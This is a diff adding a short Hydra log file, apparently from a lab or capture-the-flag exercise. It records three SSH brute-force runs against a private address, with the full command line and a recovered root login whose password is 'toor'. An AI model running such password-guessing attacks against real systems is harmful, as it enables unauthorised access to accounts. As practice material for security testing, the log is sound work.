@@ -1,0 +1,6 @@
+# Hydra v8.6 run at 2019-12-10 04:26:18 on 10.10.15.12 ssh (hydra -L usernames.txt -P passwords.txt -t 4 -e ns -o output.dat 10.10.15.12 ssh)
+[22][ssh] host: 10.10.15.12   login: root   password: toor
+# Hydra v8.6 run at 2019-12-10 04:26:29 on 10.10.15.12 ssh (hydra -L usernames.txt -P passwords.txt -t 4 -e ns -o output.dat 10.10.15.12 ssh)
+[22][ssh] host: 10.10.15.12   login: root   password: toor
+# Hydra v8.6 run at 2019-12-10 04:26:45 on 10.10.15.12 ssh (hydra -L usernames.txt -P passwords.txt -t 4 -e ns -o output.dat 10.10.15.12 ssh)
+[22][ssh] host: 10.10.15.12   login: root   password: toor
